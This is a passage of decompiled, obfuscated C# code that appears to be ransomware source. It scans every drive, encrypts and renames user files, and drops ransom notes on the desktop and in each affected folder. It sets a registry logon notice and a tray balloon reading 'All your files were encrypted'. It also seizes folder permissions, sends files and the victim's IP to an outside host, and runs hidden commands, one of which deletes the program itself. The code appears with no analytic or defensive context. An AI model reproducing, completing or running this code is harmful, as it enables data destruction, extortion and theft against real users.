				streamWriter.WriteLine(XpzNMVUBwHhS(getString_0(107396141)));
				streamWriter.WriteLine(getString_0(107395395));
				streamWriter.WriteLine(XpzNMVUBwHhS(getString_0(107395390)));
				streamWriter.WriteLine(text3);
				if (IXGBrnKSNVJar == getString_0(107396352))
				{
					streamWriter.WriteLine(getString_0(107395395));
					streamWriter.WriteLine(XpzNMVUBwHhS(getString_0(107395389)) + Convert.ToString(AukkRFRjPWcJymi.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395698), getString_0(107395312) + text3);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in mLpIayRKyplR)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395698)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395698), item + getString_0(107395698), overwrite: true);
				}
				else
				{
					File.AppendAllText(item + getString_0(107395698), getString_0(107395312) + text3);
				}
			}
			catch (Exception)
			{
			}
			if (!kdpmwXQYrgtQ && num > 10)
			{
				break;
			}
		}
		if (FmrgwwhfMbnasy == getString_0(107396850))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283));
					streamWriter2.WriteLine(XpzNMVUBwHhS(getString_0(107395246)));
					streamWriter2.WriteLine(getString_0(107395395));
					streamWriter2.WriteLine(XpzNMVUBwHhS(getString_0(107395229)));
					streamWriter2.WriteLine(text3 + XpzNMVUBwHhS(getString_0(107395620)));
					if (IXGBrnKSNVJar == getString_0(107396352))
					{
						streamWriter2.WriteLine(getString_0(107395395));
						streamWriter2.WriteLine(XpzNMVUBwHhS(getString_0(107395639)) + XpzNMVUBwHhS(getString_0(107395389)) + Convert.ToString(AukkRFRjPWcJymi.Count) + XpzNMVUBwHhS(getString_0(107395620)));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283), XpzNMVUBwHhS(getString_0(107395639)) + getString_0(107395312) + text3 + XpzNMVUBwHhS(getString_0(107395620)));
				}
			}
			catch
			{
			}
		}
		if (vfEzOPUSdQRwe == getString_0(107396850))
		{
			try
			{
				if (IXGBrnKSNVJar == getString_0(107396352))
				{
					DqGwyJRAyz.OVUveigiegjYM(getString_0(107395578), getString_0(107395573), getString_0(107395528), XpzNMVUBwHhS(getString_0(107395519)) + new WebClient().DownloadString(XpzNMVUBwHhS(getString_0(107395494))) + XpzNMVUBwHhS(getString_0(107395485)) + default(DateTime).Date.ToString() + getString_0(107395395) + XpzNMVUBwHhS(getString_0(107395444)) + Convert.ToString(AukkRFRjPWcJymi.Count) + getString_0(107395395) + XpzNMVUBwHhS(getString_0(107394851)) + getString_0(107395395) + Convert.ToString(AukkRFRjPWcJymi) + getString_0(107395395) + XpzNMVUBwHhS(getString_0(107394834)) + text3);
				}
				else
				{
					DqGwyJRAyz.OVUveigiegjYM(getString_0(107395578), getString_0(107395573), getString_0(107395528), XpzNMVUBwHhS(getString_0(107395519)) + new WebClient().DownloadString(getString_0(107395494)) + XpzNMVUBwHhS(getString_0(107395485)) + default(DateTime).Date.ToString() + getString_0(107395395) + XpzNMVUBwHhS(getString_0(107394851)) + getString_0(107395395) + Convert.ToString(AukkRFRjPWcJymi) + getString_0(107395395) + XpzNMVUBwHhS(getString_0(107394834)) + text3);
				}
			}
			catch
			{
			}
		}
		if (fAqexJEIcKmc == getString_0(107396850))
		{
			try
			{
				QzGViysloIi.cwQyJrlvDsxWj(new Uri(getString_0(107394777)));
			}
			catch
			{
			}
		}
		if (FmrgwwhfMbnasy == getString_0(107396352))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395698)))
				{
					Process.Start(XpzNMVUBwHhS(getString_0(107394776)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395698));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283)))
				{
					Process.Start(XpzNMVUBwHhS(getString_0(107394719)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283));
				}
			}
			catch
			{
			}
		}
		if (fNmnCeBtyRLy == getString_0(107396850))
		{
			if (SubzSuIqJZsa == getString_0(107396850) && !string.IsNullOrEmpty(uFuCHDmgpOnnL) && !string.IsNullOrEmpty(sZOSRFhRgSIn))
			{
				lZvkhVEmYJY(uFuCHDmgpOnnL, sZOSRFhRgSIn);
			}
			else
			{
				lZvkhVEmYJY(getString_0(107394734), getString_0(107394705));
			}
		}
		if (LTkMlaDCpNiF != getString_0(107394951))
		{
			FUjUsDYwrUQmV(LTkMlaDCpNiF);
		}
		if (!string.IsNullOrEmpty(MmCLhdrmXjijP))
		{
			try
			{
				File.Delete(MmCLhdrmXjijP);
			}
			catch
			{
			}
		}
		if (zkqKKKlIPmfFPIZ == getString_0(107394966))
		{
			FlYakovDxkPjro();
		}
	}

	public static void eVLtWawfUiPzQ()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(XpzNMVUBwHhS(getString_0(107394925)), XpzNMVUBwHhS(getString_0(107394291)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int YngMsxowrSx(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> wiwJxNgkTsVkO(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(getString_0(107394242)) && !text.ToLower().Contains(getString_0(107394221)) && !text.ToLower().Contains(getString_0(107394208)) && !text.ToLower().Contains(getString_0(107394227)) && !text.ToLower().Contains(getString_0(107394202)) && !text.ToLower().Contains(getString_0(107394149)) && !text.ToLower().Contains(getString_0(107394168)) && !text.ToLower().Contains(getString_0(107394635)) && !text.ToLower().Contains(getString_0(107394598)) && !text.ToLower().Contains(getString_0(107394621)) && !text.ToLower().Contains(getString_0(107394572)) && !text.ToLower().Contains(getString_0(107394149)) && !text.ToLower().Contains(getString_0(107394559)) && !text.ToLower().Contains(getString_0(107394538)))
				{
					array = Directory.GetFiles(text);
					goto IL_01eb;
				}
			}
			catch
			{
			}
			continue;
			IL_01eb:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107394545)) && !fileInfo.FullName.Contains(getString_0(107394496)) && !fileInfo.FullName.Contains(getString_0(107394511)) && !fileInfo.FullName.Contains(getString_0(107394462)) && !fileInfo.FullName.Contains(getString_0(107394445)) && !fileInfo.FullName.Contains(getString_0(107394460)) && !fileInfo.FullName.Contains(getString_0(107394411)) && !fileInfo.FullName.Contains(getString_0(107394398)) && !fileInfo.FullName.Contains(getString_0(107393865)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393884)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393871)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393822)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393805)) && !fileInfo.FullName.Contains(XpzNMVUBwHhS(getString_0(107393820))) && !fileInfo.FullName.Contains(getString_0(107393763)) && !fileInfo.FullName.Contains(getString_0(107393782)) && !fileInfo.FullName.EndsWith(getString_0(107395679)) && !fileInfo.FullName.EndsWith(getString_0(107393753)) && !fileInfo.FullName.EndsWith(getString_0(107393748)) && !fileInfo.FullName.EndsWith(getString_0(107393743)) && !fileInfo.FullName.EndsWith(getString_0(107393706)) && !fileInfo.FullName.Contains(getString_0(107393701)) && !fileInfo.FullName.Contains(oWAGWCpnIrmUr))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(TDenpsblwtjA) * 1024.0 * 1024.0 && IXAXCculmxrX == getString_0(107396850))
						{
							list.Add(fileInfo.FullName);
							wNOmawFcPjXszl(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && IXAXCculmxrX == getString_0(107396352))
						{
							list.Add(fileInfo.FullName);
							wNOmawFcPjXszl(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string GmDarSxQnFBGZ(string oAgUfblvRhB = "", string uhgfGZIhCCP = "")
	{
		string result = getString_0(107394777);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = oAgUfblvRhB,
				Arguments = uhgfGZIhCCP,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void xQsTyseFwMzaC(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393716),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string XPSdUrjumtYNnS(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string XpzNMVUBwHhS(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void plmFtFYCSuCgCG(string OXkiiMbIJw = "", string kgYNjYCZQxOA = "SW5mb3JtYXRpb24uLi4=", string nUyFIUZtnlALr = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		OXkiiMbIJw = XPSdUrjumtYNnS(getString_0(107393667));
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(XpzNMVUBwHhS(OXkiiMbIJw), writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(XpzNMVUBwHhS(getString_0(107394082)), XpzNMVUBwHhS(kgYNjYCZQxOA));
			registryKey.SetValue(XpzNMVUBwHhS(getString_0(107394049)), XpzNMVUBwHhS(nUyFIUZtnlALr));
			registryKey.Close();
		}
	}

	public static void UpNZjYgstdWU()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (SubzSuIqJZsa == getString_0(107396850) && !string.IsNullOrEmpty(uFuCHDmgpOnnL) && !string.IsNullOrEmpty(sZOSRFhRgSIn))
				{
					plmFtFYCSuCgCG(getString_0(107394777), uFuCHDmgpOnnL, sZOSRFhRgSIn);
				}
				else
				{
					plmFtFYCSuCgCG(getString_0(107394777), getString_0(107394734), getString_0(107394705));
				}
			}
		}
		catch
		{
		}
	}

	public static void lZvkhVEmYJY(string mFJCPezamvDHYOEl = "SW5mb3JtYXRpb24uLi4=", string fOkyJneNZTtasr = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(XpzNMVUBwHhS(mFJCPezamvDHYOEl));
		val.set_BalloonTipText(XpzNMVUBwHhS(fOkyJneNZTtasr));
		val.ShowBalloonTip(30000);
	}

	public static void FUjUsDYwrUQmV(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		GmDarSxQnFBGZ(getString_0(107394020), getString_0(107394039) + text + getString_0(107394030) + string_0);
	}

	public static bool ivQlqIjSsZmKkw()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107393993));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void rYtrFMMUXXWsWUH(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = XpzNMVUBwHhS(getString_0(107393960));
		processStartInfo.Arguments = getString_0(107393931) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool cWnPaBwTjkGoyoj(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void FlYakovDxkPjro()
	{
		GmDarSxQnFBGZ(getString_0(107396703), XpzNMVUBwHhS(getString_0(107393926)));
		string text = XpzNMVUBwHhS(getString_0(107393220));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107393155) + text + getString_0(107393155) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396703);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void NhpGuVXJqNFZ(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch
		{
		}
	}

	public static string pSVtEecOZzJBWO(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395698);
		if (!File.Exists(text))
		{
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine(XpzNMVUBwHhS(getString_0(107396141)));
				streamWriter.WriteLine(getString_0(107395395));
				streamWriter.WriteLine(XpzNMVUBwHhS(getString_0(107395390)));
				streamWriter.WriteLine(string_0);
				return text;
			}
		}
		File.AppendAllText(text, getString_0(107395312) + string_0);
		return text;
	}

	private static void jjwOjOEKOtUpGyV(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		mLYpMUryaRiSQvPX.NCjRcFMIqGOL CS_0024_003C_003E8__locals0 = new mLYpMUryaRiSQvPX();
		CS_0024_003C_003E8__locals0.EEsUbQHGqZ = string_1;
		CS_0024_003C_003E8__locals0.SIKjOIZpiViYDYpgo = string_2;
		CS_0024_003C_003E8__locals0.KmjiHQvFPVzK = string_3;
		CS_0024_003C_003E8__locals0.zMmStqWJEVV = string_4;
		ufZZLSdBndJl = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.KmjiHQvFPVzK);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396268))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !gnEYEOiddOO.Contains(array[i].Name))
					{
						gnEYEOiddOO.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!gnEYEOiddOO.Contains(string_0[j]))
				{
					gnEYEOiddOO.Add(string_0[j]);
				}
			}
		}
		if (gnEYEOiddOO.Contains(XpzNMVUBwHhS(getString_0(107393150))) && SINcssXKqspnL == getString_0(107396850))
		{
			gnEYEOiddOO.Remove(XpzNMVUBwHhS(getString_0(107393150)));
		}
		Parallel.ForEach(gnEYEOiddOO, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new mLYpMUryaRiSQvPX.NCjRcFMIqGOL();
			CS_0024_003C_003E8__locals0.cTsbrvLXpufp = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.yKCwoMIcfh = string_0;
			Thread thread = new Thread((ThreadStart)delegate
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					cWnPaBwTjkGoyoj(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.yKCwoMIcfh);
				}
			});
			thread.Priority = ThreadPriority.Normal;
			thread.IsBackground = true;
			thread.Start();
			if (IXGBrnKSNVJar == mLYpMUryaRiSQvPX.getString_0(107396859))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					AQiclxjNMx(CS_0024_003C_003E8__locals0.yKCwoMIcfh, CS_0024_003C_003E8__locals0.cTsbrvLXpufp.EEsUbQHGqZ, CS_0024_003C_003E8__locals0.cTsbrvLXpufp.zMmStqWJEVV, CS_0024_003C_003E8__locals0.cTsbrvLXpufp.SIKjOIZpiViYDYpgo, CS_0024_003C_003E8__locals0.cTsbrvLXpufp.KmjiHQvFPVzK);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				AQiclxjNMx(CS_0024_003C_003E8__locals0.yKCwoMIcfh, CS_0024_003C_003E8__locals0.EEsUbQHGqZ, CS_0024_003C_003E8__locals0.zMmStqWJEVV, CS_0024_003C_003E8__locals0.SIKjOIZpiViYDYpgo, CS_0024_003C_003E8__locals0.KmjiHQvFPVzK);
			}
		});
	}

	public static void AQiclxjNMx(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107394777));
		List<string> list3 = list2;
		if (NJsxFWbcdxOk == getString_0(107396352))
		{
			list = wiwJxNgkTsVkO(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = JLIKkWKfhvWVtNe.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((rXzetNuPLApv == getString_0(107396352) && !item.EndsWith(text)) || AukkRFRjPWcJymi.Contains(item))
				{
					continue;
				}
				if (tHjHJyCbAsL == getString_0(107396850))
				{
					try
					{
						if (qSfKWgWzWCjN.ZpfruJCHwVBFAisof(item))
						{
							qSfKWgWzWCjN.weEHRBSklsYu(item);
						}
					}
					catch
					{
					}
				}
				AukkRFRjPWcJymi.Add(item);
				if (!mLpIayRKyplR.Contains(Path.GetDirectoryName(item)))
				{
					mLpIayRKyplR.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (VAaXrNEuZTj == getString_0(107396850) && fileStream.Length > Convert.ToInt32(zSkjAkSdrNaEQ) * 1024 * 1024 && !list3.Contains(text))
					{
						if (eCgqgJacXEtH == getString_0(107396850))
						{
							foreach (string item2 in hMmNJESmajNLVSI)
							{
								if (item.ToLower().EndsWith(item2) && YsATJjivDuNMD == getString_0(107396850))
								{
									if (Convert.ToInt32(DLyLpigOjpixLmug) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											DqGwyJRAyz.CWnyAidUENok(getString_0(107395578), getString_0(107395573), getString_0(107395528), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && YsATJjivDuNMD == getString_0(107396352))
								{
									try
									{
										DqGwyJRAyz.CWnyAidUENok(getString_0(107395578), getString_0(107395573), getString_0(107395528), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = HAGwxQagSCcKAotj.zQizjsdesaGi(item, Convert.ToInt32(zSkjAkSdrNaEQ) * 1024 * 1024);
						byte[] benKFLIOMZMZK = HAGwxQagSCcKAotj.pQEqVfqBQsgNPn(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						HAGwxQagSCcKAotj.hoTNCLBmzKEOmkW(item, benKFLIOMZMZK);
						if (string_2 != getString_0(107393173))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107393173))
					{
						RgEpeKDaAeQjB(item, item + string_2, ufZZLSdBndJl);
					}
					else
					{
						RgEpeKDaAeQjB(item, item + getString_0(107393168), ufZZLSdBndJl);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void wNOmawFcPjXszl(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		xuOTRJXCHgsDSU CS_0024_003C_003E8__locals0 = new xuOTRJXCHgsDSU();
		CS_0024_003C_003E8__locals0.KnvlCnzqGAfF = list_0;
		CS_0024_003C_003E8__locals0.iuKzBvNoRYUqK = string_1;
		CS_0024_003C_003E8__locals0.lXcMiunKHQSQT = string_2;
		CS_0024_003C_003E8__locals0.ZqYERyKJrFKUDg = string_3;
		CS_0024_003C_003E8__locals0.NIDHqASSyQFTchSJr = new List<string> { getString_0(107394777) };
		if (rXzetNuPLApv == getString_0(107396352))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.KnvlCnzqGAfF)
				{
					if (CS_0024_003C_003E8__locals0.lXcMiunKHQSQT.Length != 0)
					{
						string[] lXcMiunKHQSQT2 = CS_0024_003C_003E8__locals0.lXcMiunKHQSQT;
						int num2 = 0;
						while (num2 < lXcMiunKHQSQT2.Length)
						{
							string value2 = lXcMiunKHQSQT2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_0415;
						}
					}
					if (item.EndsWith(string_0) && !AukkRFRjPWcJymi.Contains(item))
					{
						if (tHjHJyCbAsL == xuOTRJXCHgsDSU.getString_0(107396867))
						{
							try
							{
								if (qSfKWgWzWCjN.ZpfruJCHwVBFAisof(item))
								{
									qSfKWgWzWCjN.weEHRBSklsYu(item);
								}
							}
							catch
							{
							}
						}
						AukkRFRjPWcJymi.Add(item);
						if (!mLpIayRKyplR.Contains(Path.GetDirectoryName(item)))
						{
							mLpIayRKyplR.Add(Path.GetDirectoryName(item));
						}
						NhpGuVXJqNFZ(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00d3;
								}
								goto end_IL_00d3_2;
								end_IL_00d3:;
							}
							catch (Exception)
							{
								goto end_IL_00d3_2;
							}
							if (VAaXrNEuZTj == xuOTRJXCHgsDSU.getString_0(107396867) && new FileInfo(item).Length > Convert.ToInt32(zSkjAkSdrNaEQ) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.NIDHqASSyQFTchSJr.Contains(string_0))
							{
								if (eCgqgJacXEtH == xuOTRJXCHgsDSU.getString_0(107396867))
								{
									foreach (string item2 in hMmNJESmajNLVSI)
									{
										if (item.ToLower().EndsWith(item2) && YsATJjivDuNMD == xuOTRJXCHgsDSU.getString_0(107396867))
										{
											if (Convert.ToInt32(DLyLpigOjpixLmug) * 1024 * 1024 > new FileInfo(item).Length)
											{
												try
												{
													DqGwyJRAyz.CWnyAidUENok(xuOTRJXCHgsDSU.getString_0(107395595), xuOTRJXCHgsDSU.getString_0(107395590), xuOTRJXCHgsDSU.getString_0(107395545), item);
												}
												catch
												{
												}
											}
										}
										else if (item.ToLower().EndsWith(item2) && YsATJjivDuNMD == xuOTRJXCHgsDSU.getString_0(107396369))
										{
											try
											{
												DqGwyJRAyz.CWnyAidUENok(xuOTRJXCHgsDSU.getString_0(107395595), xuOTRJXCHgsDSU.getString_0(107395590), xuOTRJXCHgsDSU.getString_0(107395545), item);
											}
											catch
											{
											}
										}
									}
								}
								string text2 = lIWyTSJADVGOwjs.iUTbNhATtsHlJ(32);
								string s2 = wtkmcRpnyDquKa.QNCVDGICcd(text2);
								byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
								byte[] array2 = null;
								byte[] byte_2 = HAGwxQagSCcKAotj.zQizjsdesaGi(item, Convert.ToInt32(zSkjAkSdrNaEQ) * 1024 * 1024);
								array2 = ((!VOjbVZMNEqmaD) ? (rtwOYUfYif ? HAGwxQagSCcKAotj.pQEqVfqBQsgNPn(byte_2, Encoding.ASCII.GetBytes(text2), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HAGwxQagSCcKAotj.pQEqVfqBQsgNPn(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.ZqYERyKJrFKUDg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (rtwOYUfYif ? ZSIDzfXTtqFeicqW.ILqMkOByePBB(byte_2, Encoding.ASCII.GetBytes(text2), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ZSIDzfXTtqFeicqW.ILqMkOByePBB(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.ZqYERyKJrFKUDg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })));
								HAGwxQagSCcKAotj.hoTNCLBmzKEOmkW(item, array2, bytes2);
								if (CS_0024_003C_003E8__locals0.iuKzBvNoRYUqK != xuOTRJXCHgsDSU.getString_0(107393190))
								{
									File.Move(item, item + CS_0024_003C_003E8__locals0.iuKzBvNoRYUqK);
								}
							}
							else if (CS_0024_003C_003E8__locals0.iuKzBvNoRYUqK != xuOTRJXCHgsDSU.getString_0(107393190))
							{
								HVPRfDevtwif(item, item + CS_0024_003C_003E8__locals0.iuKzBvNoRYUqK, ufZZLSdBndJl);
							}
							else
							{
								HVPRfDevtwif(item, item + xuOTRJXCHgsDSU.getString_0(107393185), ufZZLSdBndJl);
							}
							goto IL_0415;
							end_IL_00d3_2:;
						}
						catch (Exception)
						{
							goto IL_0415;
						}
					}
					continue;
					IL_0415:
					CS_0024_003C_003E8__locals0.KnvlCnzqGAfF.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.KnvlCnzqGAfF, delegate(string string_0)
		{
			if (CS_0024_003C_003E8__locals0.lXcMiunKHQSQT.Length != 0)
			{
				string[] lXcMiunKHQSQT = CS_0024_003C_003E8__locals0.lXcMiunKHQSQT;
				int num = 0;
				while (num < lXcMiunKHQSQT.Length)
				{
					string value = lXcMiunKHQSQT[num];
					if (!string_0.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_03db;
				}
			}
			if (!AukkRFRjPWcJymi.Contains(string_0))
			{
				if (tHjHJyCbAsL == xuOTRJXCHgsDSU.getString_0(107396867))
				{
					try
					{
						if (qSfKWgWzWCjN.ZpfruJCHwVBFAisof(string_0))
						{
							qSfKWgWzWCjN.weEHRBSklsYu(string_0);
						}
					}
					catch
					{
					}
				}
				AukkRFRjPWcJymi.Add(string_0);
				if (!mLpIayRKyplR.Contains(Path.GetDirectoryName(string_0)))
				{
					mLpIayRKyplR.Add(Path.GetDirectoryName(string_0));
				}
				NhpGuVXJqNFZ(string_0);
				try
				{
					try
					{
						if (new FileInfo(string_0).Length != 0L)
						{
							goto end_IL_00ac;
						}
						goto end_IL_00ac_2;
						end_IL_00ac:;
					}
					catch (Exception)
					{
						goto end_IL_00ac_2;
					}
					if (VAaXrNEuZTj == xuOTRJXCHgsDSU.getString_0(107396867) && new FileInfo(string_0).Length > Convert.ToInt32(zSkjAkSdrNaEQ) * 1024 * 1024)
					{
						if (eCgqgJacXEtH == xuOTRJXCHgsDSU.getString_0(107396867))
						{
							foreach (string item3 in hMmNJESmajNLVSI)
							{
								if (string_0.ToLower().EndsWith(item3) && YsATJjivDuNMD == xuOTRJXCHgsDSU.getString_0(107396867))
								{
									if (Convert.ToInt32(DLyLpigOjpixLmug) * 1024 * 1024 > new FileInfo(string_0).Length)
									{
										try
										{
											DqGwyJRAyz.CWnyAidUENok(xuOTRJXCHgsDSU.getString_0(107395595), xuOTRJXCHgsDSU.getString_0(107395590), xuOTRJXCHgsDSU.getString_0(107395545), string_0);
										}
										catch
										{
										}
									}
								}
